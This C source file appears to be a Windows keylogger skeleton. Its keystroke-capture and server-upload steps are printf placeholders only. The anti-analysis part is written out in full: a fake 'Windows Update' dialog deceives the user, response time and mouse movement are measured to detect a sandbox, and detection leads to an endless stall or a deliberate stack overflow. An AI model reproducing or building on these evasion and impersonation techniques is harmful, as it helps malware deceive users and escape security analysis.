#include <math.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <time.h>
#include <Windows.h>

int checkVirtualEnvironment(); // Checks for human-like behavior
void stallCode(); // Runs a function forever that does nothing useful
void smashStack(); // Spoils the stack and crashes the program

int main() {
    ////////////////////////////////////////////////////////////////
    // Check Environment
    ////////////////////////////////////////////////////////////////

    // Create some random number to randomize behavior
    srand(time(NULL));
    int randomNum = 0;

    if (checkVirtualEnvironment()) {
        randomNum = rand();

        if (randomNum % 2 == 0) {
            stallCode();
        }else {
            smashStack();
        }
    }

    while (true) {
        ////////////////////////////////////////////////////////////////
        // Get Most Recent Keystroke
        ////////////////////////////////////////////////////////////////
        printf("Getting most recent key stroke...\n");


        ////////////////////////////////////////////////////////////////
        // Create Connection
        ////////////////////////////////////////////////////////////////
        printf("Connecting to server...\n");


        ////////////////////////////////////////////////////////////////
        // Send Keystroke
        ////////////////////////////////////////////////////////////////
        printf("Sending to server...\n");


        ////////////////////////////////////////////////////////////////
        // Close Connection
        ////////////////////////////////////////////////////////////////
        printf("Closing connection...\n");


        break;
    }
}

int checkVirtualEnvironment() {
// Check if Adoclient is running in virtual environment
// OUTPUT: 1 if true, else 0

    int result = true;
    int response = 0;
    POINT currentMousePosition;
    POINT previousMousePosition;
    double mouseDistance = 0;
    time_t startTime = 0;
    time_t timeElapsed = 0;

    // Create window prompt
    startTime = time(NULL);
    response = MessageBoxW(NULL, L"Update complete, press Cancel to continue...",
        L"Windows Update", MB_YESNOCANCEL);
    timeElapsed = time(NULL) - startTime;

    // Check if response time was faster than humanly possible
    if (timeElapsed < 1) {
        return true;
    }

    // Track mouse movement
    GetCursorPos(&previousMousePosition);
    startTime = time(NULL);

    while (true){
        GetCursorPos(&currentMousePosition);
        mouseDistance += sqrt(pow(currentMousePosition.x - previousMousePosition.x, 2) +
                              pow(currentMousePosition.y - previousMousePosition.y, 2));

        previousMousePosition = currentMousePosition;

        if (mouseDistance > 10000){
            result = false;
            break;
        }
    }

    timeElapsed = time(NULL) - startTime;

    // Check if mouse movement was faster than humanly possible
    if (timeElapsed < 2) {
        return true;
    }

    // Check if human possible read correct button to press
    if (response == IDCANCEL){
        result = false;
    }

    return result;
}

void stallCode() {
// Aimlessly inserts random ints into a list with no break condition

    printf("Stalling\n");
    srand(time(NULL));
    int a[] = {5 ,8 ,4 ,1 ,3 ,0 ,6 ,8 ,4 ,0 ,6 ,8 ,4 ,5 ,1 ,0 ,3, 2};
    int index = 0;
    
    while (true) {
        a[index] = rand() % 10 + 1;

        if (a[index] == -1) {
            break;
        }
    }
    return;
}

void smashStack() {
// Attempts to kill the process by smashing its own stack

    printf("Smashing\n");
    char buffer[1];
    strcpy(buffer, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    return;
}
